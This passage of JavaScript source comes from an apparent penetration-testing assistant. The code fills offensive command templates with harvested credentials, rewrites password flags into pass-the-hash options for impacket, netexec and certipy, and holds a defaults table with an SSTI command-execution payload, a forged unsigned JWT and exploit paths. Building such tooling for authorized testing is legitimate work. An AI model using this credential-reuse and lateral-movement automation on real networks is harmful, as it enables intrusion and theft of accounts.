        for (var kpi = 0; kpi < keyItems.length; kpi++) {
          var kpv = keyItems[kpi] || {};
          var rawKp = kpv.ssh_key_path || kpv.sshKeyPath || kpv.keyPath || kpv.key_path || kpv.keyfile || kpv.path || kpv.file || '';
          if (!pickedKeyPath && rawKp && String(rawKp).trim()) pickedKeyPath = String(rawKp).trim();
          var rawKu = kpv.user || kpv.username || kpv.owner || '';
          if (!rawKu && rawKp) {
            var kpUserM = /(?:\/home\/|\/Users\/|\\Users\\)([A-Za-z0-9._-]+)[\/\\]/i.exec(String(rawKp));
            if (kpUserM && kpUserM[1]) rawKu = kpUserM[1];
          }
          if (!pickedKeyUser && rawKu && String(rawKu).trim()) pickedKeyUser = String(rawKu).trim();
        }
        ctx.ssh_key_path = pickedKeyPath || 'id_rsa';
        if (!ctx.user && !isExplicitAnon) {
          var fallbackKeyUser = pickedKeyUser || (opts && opts.action && opts.action.id === 'ssh-key-login' ? 'root' : '');
          if (fallbackKeyUser) ctx.user = fallbackKeyUser;
        }
      }
    }
    if (!ctx.reuse_user || !ctx.reuse_secret) {
      var reuseVals = fvals('credential.reuse_candidate');
      fvals('credential.available').forEach(function (av) {
        if (av && av.unvalidatedOnTarget && av.reuseFrom) reuseVals = reuseVals.concat([av]);
      });
      if (reuseVals.length) {
        var failedUsers = Object.create(null);
        fvals('blocker.logon_failure').forEach(function (bv) {
          var bu = String((bv && (bv.user || bv.username || bv.principal)) || '').trim().toLowerCase().replace(/^.*\\/, '');
          if (bu) failedUsers[bu] = (failedUsers[bu] || 0) + 1;
        });
        var activeUserLower = String(ctx.user || ctx.username || '').trim().toLowerCase();
        var scoredCands = [];
        var keyOnlyUser = '';
        for (var rci = 0; rci < reuseVals.length; rci++) {
          var rcv = reuseVals[rci] || {};
          var rUser = String(rcv.reuse_user || rcv.user || rcv.username || '').trim();
          var rPw = rcv.reuse_secret != null && rcv.reuse_secret !== ''
            ? String(rcv.reuse_secret)
            : (rcv.password != null && rcv.password !== '' ? String(rcv.password) : (rcv.secret != null && rcv.secret !== '' ? String(rcv.secret) : ''));
          var rNt = String(rcv.nthash || rcv.hash || '').trim();
          var rSec = rPw || rNt;
          if (rUser && rSec) {
            scoredCands.push({
              user: rUser,
              secret: rSec,
              isNtOnly: !rPw && /^[0-9a-f]{32}$/i.test(rNt),
              fails: failedUsers[rUser.toLowerCase()] || 0,
              matchesActive: activeUserLower && rUser.toLowerCase() === activeUserLower ? 1 : 0,
              idx: rci
            });
          } else if (rUser && !keyOnlyUser) {
            keyOnlyUser = rUser;
          }
        }
        if (scoredCands.length) {
          scoredCands.sort(function (a, b) {
            if (a.fails !== b.fails) return a.fails - b.fails;
            if (b.matchesActive !== a.matchesActive) return b.matchesActive - a.matchesActive;
            return a.idx - b.idx;
          });
          if (!ctx.reuse_user) ctx.reuse_user = scoredCands[0].user;
          if (!ctx.reuse_secret) {
            ctx.reuse_secret = scoredCands[0].secret;
            if (scoredCands[0].isNtOnly) ctx._reuseSecretIsNtHash = true;
          }
        } else if (!ctx.reuse_user && keyOnlyUser) {
          ctx.reuse_user = keyOnlyUser;
        }
      }
    }
    if (projObj) {
      if (!projMap) { projMap = Object.create(null); _baseCtxCache.set(projObj, projMap); }
      projMap[baseKey] = Object.assign({}, ctx);
    }
    }

    // loot-materialized file tokens ({{userlist}}/{{hashfile}}/{{wordlist}}) - resolve to stable
    // paths under the workspace loot/ dir so the roast that writes {{hashfile}} and the crack that
    // reads it agree, and {{userlist}} points at the file obol can materialize from ad.user_list.
    // Only fills for an action the caller identified (opts.action); params still win over these.
    if (OBOL.loot) {
      var lt = OBOL.loot.tokensFor(opts.action || null, facts, wsd, params);
      Object.keys(lt).forEach(function (k) {
        if (ctx[k] === undefined && lt[k] !== undefined && lt[k] !== '') ctx[k] = lt[k];
      });
    }

    // extra wins
    Object.keys(extra).forEach(function (k) {
      var v = extra[k];
      if (v !== null && v !== undefined && (v !== '' || k === 'password' || k === 'nthash' || k === 'auth_realm' || k === 'authRealm')) ctx[k] = v;
    });
    if (ctx.user && !ctx.username) ctx.username = ctx.user;
    if (ctx.username && !ctx.user) ctx.user = ctx.username;
    if (ctx.nthash && String(ctx.nthash).indexOf(':') !== -1) ctx.nthash = String(ctx.nthash).split(':').pop();
    if (ctx.dahash && String(ctx.dahash).indexOf(':') !== -1) ctx.dahash = String(ctx.dahash).split(':').pop();
    if (ctx.basedn && !ctx.base_dn) ctx.base_dn = ctx.basedn;
    if (ctx.template && !ctx.cert_template) ctx.cert_template = ctx.template;
    if (ctx.group && !ctx.target_group) ctx.target_group = ctx.group;
    if (ctx.target_sam && !ctx.victim) ctx.victim = ctx.target_sam;
    if (ctx.lhost && !ctx.attacker_ip) ctx.attacker_ip = ctx.lhost;
    if (ctx.hashfile && !ctx.hashes_file) ctx.hashes_file = ctx.hashfile;
    if (ctx.sid && !ctx.oracle_sid) ctx.oracle_sid = ctx.sid;
    var credObjForCtx = resolved && resolved.credential;
    var needCredLookup = (extra && extra.credentialId && (!credObjForCtx || credObjForCtx.id !== extra.credentialId))
      || (!credObjForCtx && ctx.user && (ctx.password || ctx.nthash));
    var allCredsForCtx = [];
    if (needCredLookup) {
      if (resolved && resolved._frame && Array.isArray(resolved._frame.registry)) {
        allCredsForCtx = resolved._frame.registry;
      } else {
        var engForCtx = (resolved && resolved.engagement) || opts.engagement || (root.OBOL && root.OBOL.store && root.OBOL.store.active && root.OBOL.store.active());
        allCredsForCtx = (engForCtx && root.OBOL && root.OBOL.context && root.OBOL.context.credentials) ? root.OBOL.context.credentials(engForCtx) : [];
      }
    }
    if (extra && extra.credentialId && (!credObjForCtx || credObjForCtx.id !== extra.credentialId)) {
      for (var cci = 0; cci < allCredsForCtx.length; cci++) {
        if (allCredsForCtx[cci] && allCredsForCtx[cci].id === extra.credentialId) {
          credObjForCtx = allCredsForCtx[cci];
          break;
        }
      }
    }
    if (!credObjForCtx && ctx.user && (ctx.password || ctx.nthash)) {
      var uLowCtx = String(ctx.user).toLowerCase();
      var pwCtx = String(ctx.password || '');
      var ntCtx = String(ctx.nthash || '').toLowerCase();
      for (var cmi = 0; cmi < allCredsForCtx.length; cmi++) {
        var cm = allCredsForCtx[cmi];
        if (!cm || String(cm.username || cm.user || '').toLowerCase() !== uLowCtx) continue;
        if ((pwCtx && cm.password === pwCtx) || (ntCtx && String(cm.hash || cm.nthash || '').toLowerCase() === ntCtx)) {
          credObjForCtx = cm;
          break;
        }
      }
    }
    var domForLocal = String(ctx.domain || '').trim().toLowerCase();
    var realmForLocal = String(ctx.auth_realm || ctx.authRealm || (credObjForCtx && (credObjForCtx.realm || credObjForCtx.domain)) || '').trim().toLowerCase();
    var tgtIpsForDc = String(ctx.target || '').trim().split(/\s+/).filter(Boolean);
    var isTargetDcForCtx = false;
    if (facts && Array.isArray(facts.facts) && tgtIpsForDc.length) {
      isTargetDcForCtx = tgtIpsForDc.every(function (ip) {
        var sc = 'host:' + ip;
        return facts.facts.some(function (f) {
          return f && f.state === 'supported' && f.scope === sc && (f.kind === 'ad.domain_controller' || f.kind === 'kerberos.reachable' || f.kind === 'port:88');
        });
      });
    } else if (facts && typeof facts.has === 'function') {
      isTargetDcForCtx = !!(facts.has('ad.domain_controller') || facts.has('kerberos.reachable') || facts.has('port:88'));
    }
    var isAdDomForCtx = domForLocal.indexOf('.') > 0 && domForLocal !== 'workgroup';
    if (isAdDomForCtx && !isTargetDcForCtx && ctx.user) {
      var acctTypeLocal = ctx.accountType === 'local' || (credObjForCtx && credObjForCtx.accountType === 'local');
      var hasExplicitLocalRealm = !!(realmForLocal && realmForLocal !== domForLocal && realmForLocal !== domForLocal.split('.')[0]);
      var hasHostHintForLocal = !!(ctx.forHost || (credObjForCtx && (credObjForCtx.forHost || credObjForCtx.realm_hint || credObjForCtx.realmHint)));
      var isSameHostAdminCred = !!(credObjForCtx && credObjForCtx.inferredDomain && credObjForCtx.originHost && tgtIpsForDc.indexOf(String(credObjForCtx.originHost)) >= 0 && /^(?:administrator|admin)$/i.test(String(ctx.user || '')));
      if (acctTypeLocal || hasExplicitLocalRealm || hasHostHintForLocal || isSameHostAdminCred) {
        ctx._localSamOnDomainHost = true;
      }
    }
    return ctx;
  }

  function quoteStateAt(str, idx, shell) {
    var q = '';
    for (var i = 0; i < idx; i++) {
      var ch = str.charAt(i);
      if ((shell === 'powershell' && ch === '`' && q !== "'") || (shell === 'bash' && ch === '\\' && q !== "'")) { i++; continue; }
      if (shell === 'powershell' && q === "'" && ch === "'" && str.charAt(i + 1) === "'") { i++; continue; }
      if (!q && (ch === '"' || (shell !== 'cmd' && ch === "'"))) q = ch;
      else if (q === ch) q = '';
    }
    return q;
  }

  function inferShell(run) {
    if (/^\s*(?:powershell(?:\.exe)?\b|pwsh(?:\.exe)?\b|\$[A-Za-z_][A-Za-z0-9_]*\s*=|\$env:|(?:Get|Set|Add|Remove|New|Invoke|Import|Start|Stop|Enable|Disable|Select|Where|ForEach|Test|Out|Format)-[A-Za-z]|IEX\b)/i.test(run)) return 'powershell';
    if (/^\s*(?:cmd\s+\/c\b|schtasks\b|reg\s+(?:query|add|save)|icacls\b|net\s+(?:user|localgroup|share|use)|type\s+|(?:hostname|whoami|ipconfig)\b[^\r\n]*&\s*(?:hostname|ipconfig|type)\b|(?:\.\\)?(?:Rubeus|SharpHound|certutil|mimikatz|procdump|GodPotato|PrintSpoofer|JuicyPotato|SweetPotato|accesschk|winPEAS\w*)\.exe\b)/i.test(run)) return 'cmd';
    if (/^\s*(?:hostname|whoami|ipconfig)\b[^\r\n]*;\s*(?:hostname|ipconfig|type|Get-)/i.test(run)) return 'powershell';
    return 'bash';
  }

  function renderValue(value, key, shell, quote, opts) {
    var s = String(value);
    if (EXPRESSION_TOKENS[key] || (opts.expressionTokens && opts.expressionTokens.indexOf(key) >= 0)) return s;
    if (key === 'target' && !quote && /^[0-9a-zA-Z.:_/-]+(?:\s+[0-9a-zA-Z.:_/-]+)+$/.test(s)) return s;
    if (shell === 'powershell') {
      if (quote === "'") return s.replace(/'/g, "''");
      if (quote === '"') return s.replace(/`/g, '``').replace(/(["$])/g, '`$1');
      return /^[A-Za-z0-9_@%+=:,.\\\/-]+$/.test(s) ? s : "'" + s.replace(/'/g, "''") + "'";
    }
    if (shell === 'cmd') {
      // CMD expands %variables% and delayed !variables! even inside quotes. Refuse
      // unrepresentable literals rather than handing the operator an altered argument.
      if (/["%\r\n\x00]|![^!\r\n]+!/.test(s)) {
        if (opts.errors) opts.errors.push('Cannot safely render ' + key + ' for CMD. Use PowerShell or Bash.');
        return '{{' + key + '}}';
      }
      if (quote === '"') return s;
      return /^[A-Za-z0-9_@+=:,.\\\/-]+$/.test(s) ? s : '"' + s + '"';
    }
    if (quote === "'") return s.replace(/'/g, "'\\''");
    if (quote === '"') return s.replace(/(["\\$`])/g, '\\$1');
    if (PATH_TOKENS.test(key) && /^~\//.test(s)) {
      return /^[A-Za-z0-9_@%+=:,.\/-]+$/.test(s.slice(1)) ? s : '"$HOME"' + shellQuote(s.slice(1));
    }
    return shellQuote(s);
  }

  var TOKEN_DEFAULTS = {
    access_key: 'AKIAIOSFODNN7EXAMPLE',
    app_path: 'app',
    attacker_computer: 'evilpc',
    backup_archive: '/var/backups/backup.zip',
    bearer: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9',
    binary: '/usr/bin/vim',
    blob: 'cred.bin',
    branch: 'dev',
    cert_file: 'cert.pfx',
    ciphertext: '0822455D0A16',
    clsid: '{00000000-0000-0000-0000-000000000001}',
    cmd: 'id',
    command: 'whoami',
    community: 'public',
    cookie: '1234567890abcdef',
    cookie_payload: 'eyJ1c2VyIjoiYWRtaW4ifQ==',
    core: 'collection1',
    credential_blob: 'cred.bin',
    database: 'mysql',
    db_file: 'app.db',
    dc_fqdn: 'dc01.corp.local',
    default_size: '0',
    dll_name: 'version',
    dll_path: 'C:\\Program Files\\App',
    encrypted_file: 'backup.gpg',
    endpoint: 'api/v1',
    exploit_binary: '.\\exploit.exe',
    exploit_src: 'exploit.c',
    export: '/var/nfs',
    fail_string: 'Invalid',
    file: 'request.txt',
    file_path: 'document.docm',
    filename: 'root.txt',
    fmt: 'raw-md5',
    forged_jwt: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.',
    form_body: 'username=^USER^&password=^PASS^',
    form_path: '/login',
    gmsa_account: 'svc_gmsa',
    gpo_id: '{31B2F340-016D-11D2-945F-00C04FB984F9}',
    hash: '5f4dcc3b5aa765d61d8327deb882cf99',
    hijack_name: 'service',
    hostname: 'target.local',
    image: 'alpine',
    index: '_all',
    instance: 'i-0123456789abcdef0',
    internal_host: '172.16.1.10',
    kb_or_cve: 'MS16-032',
    kdbx_file: 'Database.kdbx',
    kerberos_command: 'impacket-getTGT',
    kernel: '5.4.0',
    key_file: 'id_rsa',
    keyfile: 'id_rsa',
    krbtgt_aes256: '0000000000000000000000000000000000000000000000000000000000000000',
    listener_port: '8080',
    local_path: 'loot.txt',
    local_port: '18080',
    masterkey_file: 'masterkey',
    masterkey_hex: '0102030405060708090a0b0c0d0e0f10',
    mode: '0',
    module: 'files',
    neighbor_hosts: '172.16.1.0/24',
    newpass: 'Passw0rd123!',
    nsclient_password: 'password',
    oracle_sid: 'XE',
    passphrase: 'password',
    path: 'backup.mdb',
    payload: 'whoami',
    payload_path: 'C:\\Windows\\Temp\\shell.exe',
    phpsessid: '1234567890abcdef',
    pipe_name: 'mojo.5688.8052.183894939787088877',
    port: '6667',
    preview_endpoint: 'preview',
    project: 'my-project',
    record_name: 'evil',
    relay_target: '10.10.10.10',
    remote_path: 'passwords.txt',
    request_id: '1',
    resource_group: 'rg-prod',
    rid: '1105',
    script: 'query.sql',
    script_dir: '/opt',
    script_path: '/opt/cleanup.py',
    secret: 'app-secret',
    secret_key: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    service: 'Spooler',
    session: 'session=1234567890abcdef',
    sid: 'XE',
    socket_path: '/tmp/tmux-0/default',
    spn_host: 'dc01.corp.local',
    spoofed_name: 'evilpc',
    ssh_pubkey: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... kali@obol',
    ssti_rce_payload: '{{7*7}}',
    ssti_shell_payload: '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    stream_id: '1',
    stream_name: 'flag.txt',
    sudo_command: '/usr/sbin/apache2',
    suid_bin: '/usr/local/bin/suid-binary',
    table: 'users',
    target_computer: 'DC01',
    target_doc_path: 'C:\\Docs',
    target_file: '/root/root.txt',
    task_name: '\\BackupTask',
    task_target: 'C:\\Scripts\\backup.bat',
    token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
    type: 'md5',
    unit: 'backup.service',
    unit_path: '/etc/systemd/system/backup.service',
    upload_path: 'uploads',
    url_param: 'url',
    user_sid: 'S-1-5-21-1000000000-1000000000-1000000000-1001',
    vhd_path: 'backup.vhd',
    victim_fqdn: 'srv01.corp.local',
    viewstate: 'wEPDwUKLTEzNDM3NzkxOWRkfA==',
    vm_name: 'vm-prod',
    vnc_hex: 'e3b0c44298fc1c14',
    vnc_hex_or_file: 'e3b0c44298fc1c14',
    vnc_hex_pass: 'e3b0c44298fc1c14',
    wildcard_size: '0',
    writable_dir: '/opt/backups'
  };

  // A single pass ensures discovered values cannot introduce new template tokens.
  function fillTemplate(text, facts, opts) {
    if (!text) return '';
    opts = opts || {};
    var cmd = String(text).split('\\{\\{').join(LIT_OPEN).split('\\}\\}').join(LIT_CLOSE);
    var ctx = opts._prebuiltCtx || buildContext(facts, opts), shell = opts.shell || inferShell(cmd);
    // When an NT-hash-only credential is active (no cleartext password, nthash present),
    // automatically adapt AD tool templates from -p '{{password}}' / domain/user:{{password}} to Pass-the-Hash.
    if (!ctx.password && ctx.nthash && cmd.indexOf('{{password}}') >= 0) {
      if (/\b(?:nxc|netexec|crackmapexec|cme|smbmap|evil-winrm|pywhisker(?:\.py)?|targetedKerberoast(?:\.py)?)\b/i.test(cmd)) {
        cmd = cmd.replace(/(\s)-p\s+(?:'\{\{password\}\}'|"\{\{password\}\}"|\{\{password\}\})/g, "$1-H '{{nthash}}'");
      } else if (/\b(?:bloodyAD|dnstool(?:\.py)?|sccmhunter(?:\.py)?)\b/i.test(cmd)) {
        cmd = cmd.replace(/(\s)-p\s+(?:'\{\{password\}\}'|"\{\{password\}\}"|\{\{password\}\})/g, "$1-p ':{{nthash}}'");
      } else if (/\bcertipy(?:-ad)?\b/i.test(cmd)) {
        cmd = cmd.replace(/(\s)-p\s+(?:'\{\{password\}\}'|"\{\{password\}\}"|\{\{password\}\})/g, "$1-hashes ':{{nthash}}'");
      } else if (/\bbloodhound-python\b/i.test(cmd)) {
        cmd = cmd.replace(/(\s)-p\s+(?:'\{\{password\}\}'|"\{\{password\}\}"|\{\{password\}\})/g, "$1--hashes 'aad3b435b51404eeaad3b435b51404ee:{{nthash}}'");
      } else if (/\bxfreerdp3?\b/i.test(cmd)) {
        cmd = cmd.replace(/\/p:(?:'\{\{password\}\}'|"\{\{password\}\}"|\{\{password\}\})/g, "/pth:{{nthash}}");
      } else if (/\b(?:smbclient|rpcclient|net\s+rpc)\b/i.test(cmd)) {
        cmd = cmd.replace(/(-U\s+)(['"])([^'"]*?)%\{\{password\}\}\2/g, "$1$2$3%{{nthash}}$2 --pw-nt-hash");
        cmd = cmd.replace(/(-U\s+\S+?)%(?:'\{\{password\}\}'|"\{\{password\}\}"|\{\{password\}\})/g, "$1%{{nthash}} --pw-nt-hash");
      } else if (/\b(?:impacket-[\w-]+|(?:GetUserSPNs|GetNPUsers|Get-GPPPassword|raiseChild|secretsdump|ticketer|findDelegation|addcomputer|rbcd|dacledit|owneredit|getST|getTGT|psexec|wmiexec|smbexec|atexec|dcomexec|mssqlclient|noPac|goldenPac|lookupsid|rpcdump|samrdump|services|reg)(?:\.py)?)\b/i.test(cmd)) {
        cmd = cmd.replace(/(['"])(\{\{domain\}\}\/\{\{(?:user|username)\}\}):\{\{password\}\}(@[^'"]+)?\1(@\S+)?/g, function (_, q, ident, inAt, outAt) {
          return q + ident + (inAt || '') + q + (outAt || '') + " -hashes ':{{nthash}}'";
        });
        cmd = cmd.replace(/(['"]?\{\{domain\}\}['"]?\/['"]?\{\{(?:user|username)\}\}['"]?):(?:'\{\{password\}\}'|"\{\{password\}\}"|\{\{password\}\})(@\S+)?/g, function (_, ident, outAt) {
          return ident + (outAt || '') + " -hashes ':{{nthash}}'";
        });
        cmd = cmd.replace(/(\s)-p\s+(?:'\{\{password\}\}'|"\{\{password\}\}"|\{\{password\}\})/g, "$1-hashes ':{{nthash}}'");
      }
    }
    if (ctx._reuseSecretIsNtHash && cmd.indexOf('{{reuse_secret}}') >= 0) {
      if (/\b(?:nxc|netexec|crackmapexec|cme|smbmap|evil-winrm|pywhisker(?:\.py)?|targetedKerberoast(?:\.py)?)\b/i.test(cmd)) {
        cmd = cmd.replace(/(\s)-p\s+(?:'\{\{reuse_secret\}\}'|"\{\{reuse_secret\}\}"|\{\{reuse_secret\}\})/g, "$1-H '{{reuse_secret}}'");
      }
    }
    cmd = cmd.replace(/\{\{([a-zA-Z0-9_]+)(?:\|((?:\{\{[a-zA-Z0-9_]+\}\}|[^{}])*))?\}\}/g, function (placeholder, key, defVal, offset) {
      var value = ctx[key];
      if (key === 'target' && value && /\brustscan\b/i.test(cmd) && /\s/.test(String(value))) {
        value = String(value).trim().replace(/\s+/g, ',');
      }
      if ((key === 'target_sam' || key === 'victim') && value && /\b(?:setuserinfo2|net\s+rpc\s+password|Set-ADAccountPassword|bloodyAD\b[^\r\n]*\bset\s+password)\b/i.test(cmd)) {
        var vl = String(value).trim().toLowerCase();
        var isGrp = vl.indexOf(' ') >= 0 || /^(?:domain admins|enterprise admins|administrators|exchange windows permissions|account operators|organization management|backup operators|server operators|dnsadmins|print operators|group policy creator owners|key admins|enterprise key admins)$/.test(vl);
        if (isGrp) value = ctx.target_user || 'Administrator';
      }
      if (key === 'domain' && ctx.auth_realm && ctx.user) {
        var before = cmd.slice(0, offset), after = cmd.slice(offset + placeholder.length);
        var principalRealm = /\{\{(?:user|username)\}\}@['"]?$/.test(before) || /^(?:\/|\\+)\{\{(?:user|username)\}\}/.test(after);
        var authFlag = (/(?:^|\s)(?:-d|--domain|-domain)\s+['"]?$/.test(before)
          && /\b(?:nxc|netexec|crackmapexec|smbmap|smbclient|rpcclient)\b/.test(cmd))
          || (/\/d:['"]?$/.test(before) && /\bxfreerdp3?\b/i.test(cmd));
        if (principalRealm || authFlag) value = /^\d{1,3}(?:\.\d{1,3}){3}$/.test(String(ctx.auth_realm)) ? '.' : ctx.auth_realm;
      }
      if (value === undefined || value === null || value === '') {
        var fallback = defVal !== undefined ? defVal : (!EARNED_TOKENS[key] && Object.prototype.hasOwnProperty.call(TOKEN_DEFAULTS, key) ? TOKEN_DEFAULTS[key] : undefined);
        if (fallback === undefined) return placeholder;
        value = String(fallback).replace(/\{\{([a-zA-Z0-9_]+)\}\}/g, function (nested, name) {
          return ctx[name] !== undefined && ctx[name] !== null && ctx[name] !== '' ? String(ctx[name]) : nested;
        });
        if (value === '' || /^\{?\{\{[a-zA-Z0-9_|]+\}\}\}?$/.test(value)) return value;
        if (opts._defaultedTokens && opts._defaultedTokens.indexOf(key) === -1) opts._defaultedTokens.push(key);
        if (opts._defaultValues) opts._defaultValues[key] = value;
        if (opts._keepDefaultedAsToken) return '{{' + key + '}}';
      }
      return renderValue(value, key, shell, quoteStateAt(cmd, offset, shell), opts);
    });
    var outCmd = cmd.split(LIT_OPEN).join('{{').split(LIT_CLOSE).join('}}');
    var unquotedOutCmd = outCmd.replace(/'[^']*'|"(?:\\.|[^"\\])*"/g, '');
    if (ctx._localSamOnDomainHost
        && /\b(?:nxc|netexec|crackmapexec|cme)\s+(?:smb|winrm|wmi|rdp|mssql)\b/i.test(outCmd)
        && /\s-u\s+(?!''\b|""\b|['"]?guest['"]?\b)\S+/i.test(outCmd)
        && /\s-(?:p|H)\s+\S+/i.test(outCmd)
        && !/(?:^|\s)(?:--local-auth|-d|--domain|-k|--use-kcache)\b/i.test(outCmd)
        && !/[|;&><\r\n]/.test(unquotedOutCmd)) {
      outCmd += ' --local-auth';
    }
    return outCmd;
  }

  // -- Loadout command-rewrite ------------------------------------------------------
  // Once the operator has synced their box (Loadout), rewrite a filled command to THEIR box's reality:
  //   - tool invocation: impacket-psexec <-> psexec.py <-> python3 .../psexec.py; nxc <-> netexec <-> crackmapexec
  //   - wordlist paths: the real rockyou / SecLists location on this box
  // Conservative + reversible: only a recognized ARSENAL variant appearing as a STANDALONE token is
  // swapped, and only for the actual invocation the box reported; anything un-synced or unknown is left
  // exactly as authored (today's behavior). Reads the per-browser profile from localStorage (so it needs
  // none of the lazy arsenal.js); a profile may be passed explicitly (tests / callers that already have it).
  var _arsenalRaw = null;
  var _arsenalParsed = null;
  function _arsenalProfile() {
    try {
      var raw = typeof localStorage !== 'undefined' ? localStorage.getItem('obol.arsenal-profile') : null;
      if (!raw) { _arsenalRaw = null; _arsenalParsed = null; return null; }
      if (raw === _arsenalRaw) return _arsenalParsed;
      _arsenalRaw = raw;
      _arsenalParsed = JSON.parse(raw);
      return _arsenalParsed;
    } catch (e) { return null; }
  }
  function _reEsc(s) { return String(s).replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }
  function applyArsenal(filled, action, prof) {
    if (!filled) return filled;
    prof = prof || _arsenalProfile();
    if (!prof) return filled;
    var A = (root.OBOL && root.OBOL.ARSENAL) || {};
    var ptools = prof.tools || {};
    var rawTools = [];
    if (action) {
      if (action.tools && action.tools.length) rawTools = rawTools.concat(action.tools);
      if (action.tool) rawTools.push(action.tool);
      if (action.cmdTool) rawTools.push(action.cmdTool);
    }
    // Also inspect standalone command tokens in `filled` so multi-tool pipelines and per-variant tools rewrite cleanly.
    String(filled).split(/[\s|;&()`"']+/).forEach(function (tok) {
      if (!tok || tok.charAt(0) === '-') return;
      var base = tok.split('/').pop().toLowerCase();
      if (A[base]) rawTools.push(base);
      else if (base.slice(-3) === '.py' && A[base.slice(0, -3)]) rawTools.push(base.slice(0, -3));
    });
    var seenKey = {};
    rawTools.forEach(function (t) {
      if (!t) return;
      var tl = String(t).toLowerCase();
      var e = A[tl] || (tl.slice(-3) === '.py' ? A[tl.slice(0, -3)] : null);
      if (!e || seenKey[e.key]) return;
      if (e.class === 'stage-win' || e.class === 'stage-lin' || e.class === 'material') return;
      seenKey[e.key] = 1;
      var rec = ptools[e.key];
      var inv = rec && rec.present && rec.invocation;
      if (!inv || /^\/usr\/(?:include|lib)/.test(inv) || /^\/.*\.(?:exe|ps1|bat|msi)$/i.test(inv)) return;
      // Guard older profiles where a cloned git repo recorded its bare lowercase key instead of a script invocation
      if (rec.via === 'cloned' && inv === e.key && e.canonical && e.canonical !== e.key) {
        inv = rec.path ? ('python3 ' + rec.path.replace(/\/+$/, '') + '/' + e.canonical) : e.canonical;
      }
      var variants = (e.variants && e.variants.length) ? e.variants.slice() : [e.canonical || e.key];
      if (e.canonical && variants.indexOf(e.canonical) < 0) variants.push(e.canonical);
      var pyVariants = variants.filter(function (x) { return x && x.slice(-3).toLowerCase() === '.py'; });
      var uniqPy = {};
      pyVariants.forEach(function (x) {
        var xl = x.toLowerCase();
        if (xl !== 'poc.py' && xl !== 'exploit.py') uniqPy[xl] = 1;
      });
      var multiPyRepo = Object.keys(uniqPy).length > 1;
      variants.forEach(function (v) {
        if (!v) return;
        var vl = v.toLowerCase();
        var vInv = inv;
        if (rec.scripts && rec.scripts[vl]) {
          var sp = rec.scripts[vl];
          vInv = (sp.slice(-3).toLowerCase() === '.py' && sp.indexOf('python') !== 0) ? ('python3 ' + sp) : sp;
        } else if (multiPyRepo && vl.slice(-3) === '.py') {
          var invBase = inv.split('/').pop().toLowerCase();
          if (invBase !== vl && inv.indexOf('/') >= 0) {
            var dirPart = inv.slice(0, inv.lastIndexOf('/'));
            if (dirPart.indexOf('python') !== 0 && vl.slice(-3) === '.py') dirPart = 'python3 ' + dirPart;
            vInv = dirPart + '/' + v;
          } else if (rec.dir) {
            vInv = 'python3 ' + String(rec.dir).replace(/\/+$/, '') + '/' + v;
          }
        }
        var isPy = vl.slice(-3) === '.py' || vInv.indexOf('python') === 0;
        if (isPy) {
          var pyRe = new RegExp('(^|\\s)(?:python3?\\s+)?(?:(?:\\$HOME|~|\\/opt|\\/usr\\/local|\\/usr\\/share|\\/home\\/[^\\s"\';|&\\/]+)\\/[^\\s"\';|&]*\\/)?' + _reEsc(v) + '(?=\\s|$)', 'gi');
          filled = filled.replace(pyRe, '$1' + vInv);
        } else if (v !== vInv) {
          filled = filled.replace(new RegExp('(^|\\s)' + _reEsc(v) + '(?=\\s|$)', 'g'), '$1' + vInv);
        }
      });
    });
    var wl = prof.wordlists || {};
    if (wl.rockyou) {
      filled = filled.replace(/\/usr\/share\/wordlists\/rockyou\.txt(?:\.gz)?/g, wl.rockyou)
                     .replace(/(^|\s)rockyou\.txt(?=\s|$)/g, '$1' + wl.rockyou);
    }
    if (wl.seclists) {
      filled = filled.replace(/\/usr\/share\/(?:wordlists\/)?(?:seclists|SecLists)\b/g, wl.seclists);
    }
    if (ptools.searchsploit && ptools.searchsploit.present && !/\bsearchsploit\s+-m\b/.test(filled)) {
      var edbM = /^(?:python[23]?|ruby|perl|bash|sh)\s+(\d{4,6})\.(py|rb|pl|sh)(?=\s|$)/.exec(filled);
      if (edbM) {
        var edbId = edbM[1], edbFn = edbM[1] + '.' + edbM[2];
        var ssInv = ptools.searchsploit.invocation || 'searchsploit';
        filled = '([ -f ' + edbFn + ' ] || ' + ssInv + ' -m ' + edbId + ' >/dev/null 2>&1) && ' + filled;
      }
    }
    return filled;
  }

  // ---- Pillar 6 Helpers: SOCKS auto-wrap (6.1), Exploit-DB safe-copy auto-patcher (6.4), Tier A web form/CSRF wiring (6.6) ----
  var _LOCAL_OR_LISTENER_CMD_RE = /^(?:sudo\s+)?(?:hashcat|john|searchsploit|msfvenom|gcc|g\+\+|clang|[A-Za-z0-9_-]*mingw32-gcc|javac|2to3|dos2unix|cp|mv|rm|mkdir|chmod|chown|sed|awk|grep|egrep|fgrep|cat|head|tail|sort|uniq|cut|tr|echo|printf|base64|xxd|file|strings|unzip|7z[ar]?|tar|openssl\s+(?:passwd|enc|dgst|x509|req|pkcs12|rsa)|python3?\s+-m\s+(?:http\.server|py_compile|venv)|\/tmp\/edb-venv\/bin\/pip|pip3?\s+install|nc\s+-[A-Za-z]*l|ncat\s+-[A-Za-z]*l|rlwrap\s+nc|socat\s+TCP-LISTEN|chisel\s+server|ligolo-proxy|sshuttle|ip\s+(?:route|tuntap|link|addr)|responder|tcpdump)\b/i;

  function _factValsForTarget(facts, kind, targetIp) {
    if (!facts) return [];
    var out = [];
    var wantScope = targetIp ? ('host:' + String(targetIp).trim()) : '';
    if (Array.isArray(facts.facts)) {
      for (var i = 0; i < facts.facts.length; i++) {
        var f = facts.facts[i];
        if (!f || f.state !== 'supported' || f.kind !== kind) continue;
        if (wantScope && f.scope && f.scope !== wantScope && f.scope !== 'host:target') continue;
        if (f.value && typeof f.value === 'object') out.push(f.value);
      }
      return out;
    }
    if (typeof facts.values === 'function') return facts.values(kind) || [];
    return out;
  }

  function _buildEdbCliArgs(cliFlags, ctx) {
    if (!Array.isArray(cliFlags) || !cliFlags.length) return '';
    var lowerMap = Object.create(null);
    cliFlags.forEach(function (fl) { lowerMap[String(fl).toLowerCase()] = fl; });
    function pick(cands) {
